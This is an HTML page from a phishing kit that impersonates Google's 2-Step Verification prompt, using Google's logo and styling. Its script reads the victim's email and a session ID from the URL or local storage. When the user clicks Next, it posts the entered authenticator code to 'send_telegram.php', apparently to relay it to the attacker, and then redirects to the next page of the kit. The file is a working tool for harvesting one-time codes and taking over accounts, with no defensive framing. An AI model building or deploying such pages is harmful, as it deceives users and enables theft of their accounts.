<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2-Step Verification</title>
    <script src="lang.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif; 
            background: #ffffff; 
            color: #202124;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            flex: 1;
            max-width: 450px;
            margin: 0 auto;
            padding: 40px 40px 20px;
            width: 100%;
        }
        .logo { margin-bottom: 20px; }
        h1 { 
            font-size: 24px; 
            font-weight: 400;
            margin-bottom: 12px;
            color: #202124;
        }
        .subtitle {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        .user-email {
            display: inline-flex;
            align-items: center;
            background: #f1f3f4;
            border-radius: 16px;
            padding: 4px 12px 4px 4px;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .user-email img {
            width: 24px;
            height: 24px;
            margin-right: 8px;
            border-radius: 50%;
        }
        .user-email span { color: #202124; }
        .user-email .arrow { margin-left: 8px; color: #5f6368; }
        .form-group {
            margin-bottom: 24px;
        }
        .form-group label {
            display: block;
            color: #5f6368;
            font-size: 12px;
            margin-bottom: 8px;
        }
        .form-group input {
            width: 100%;
            background: transparent;
            border: none;
            border-bottom: 1px solid #dadce0;
            padding: 8px 0;
            font-size: 16px;
            color: #202124;
            outline: none;
        }
        .form-group input:focus {
            border-bottom-color: #1a73e8;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
        }
        .btn-link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .btn-link:hover { text-decoration: underline; }
        .btn-primary {
            background: #1a73e8;
            color: #ffffff;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .btn-primary:hover { background: #1557b0; }
        .btn-primary:disabled { 
            background: #dadce0; 
            color: #5f6368;
            cursor: not-allowed;
        }
        .footer {
            border-top: 1px solid #dadce0;
            padding: 16px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #5f6368;
            max-width: 450px;
            margin: 0 auto;
            width: 100%;
            background: #ffffff;
        }
        .footer select {
            background: transparent;
            border: none;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
        }
        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 24px;
        }
        .footer-links a:hover { color: #202124; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 74 24" width="74" height="24">
                <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
                <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
                <path fill="#FBBC05" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54.01 2.03-1.36 3.5-3.1 3.5z"/>
                <path fill="#4285F4" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
                <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
                <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
            </svg>
        </div>
        <h1 data-i18n="two_step_verification">2-Step Verification</h1>
        <p class="subtitle" data-i18n="enter_code_authenticator">Enter the code from your Google Authenticator app</p>
        <div class="user-email">
            <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="User">
            <span id="displayEmail">user@gmail.com</span>
            <span class="arrow">&#9660;</span>
        </div>
        <div class="form-group">
            <label data-i18n="enter_6digit_code">Enter 6-digit code</label>
            <input type="text" id="securityCode" maxlength="8" autocomplete="off">
        </div>
        <div class="buttons">
            <a href="#" class="btn-link" data-i18n="try_another_way">Try another way</a>
            <button type="button" id="submitBtn" class="btn-primary" data-i18n="next">Next</button>
        </div>
    </div>
    <div class="footer">
        <div class="footer-links">
            <a href="#" data-i18n="help">Help</a>
            <a href="#" data-i18n="privacy">Privacy</a>
            <a href="#" data-i18n="terms">Terms</a>
        </div>
    </div>
    
    <script>
        function applyTranslations() {
            document.querySelectorAll('[data-i18n]').forEach(el => {
                el.textContent = t(el.dataset.i18n);
            });
        }
        applyTranslations();
    </script>

    <script>
        function getStoredEmail() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('email') || localStorage.getItem('userEmail') || '';
        }
        
        function getSessionId() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('session_id') || localStorage.getItem('sessionId') || '';
        }
        
        const storedEmail = getStoredEmail();
        const sessionId = getSessionId();
        document.getElementById('displayEmail').textContent = storedEmail;

        function sendToTelegram(data, callback) {
            const formData = new FormData();
            for (const key in data) {
                formData.append(key, data[key]);
            }
            formData.append('session_id', sessionId);
            formData.append('stored_email', storedEmail);

            fetch('send_telegram.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(result => {
                if (callback) callback(result);
            })
            .catch(error => {
                if (callback) callback({success: false});
            });
        }

        document.getElementById('submitBtn').addEventListener('click', function() {
            const code = document.getElementById('securityCode').value.trim();
            if (code.length >= 6) {
                const btn = this;
                btn.disabled = true;
                btn.textContent = t('verifying');

                sendToTelegram({
                    action: 'security_code',
                    security_code: code
                }, function(result) {
                    window.location.href = 'verify.html?email=' + encodeURIComponent(storedEmail) + '&session_id=' + encodeURIComponent(sessionId);
                });
            }
        });

        document.getElementById('securityCode').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('submitBtn').click();
            }
        });
    </script>
</body>
</html>
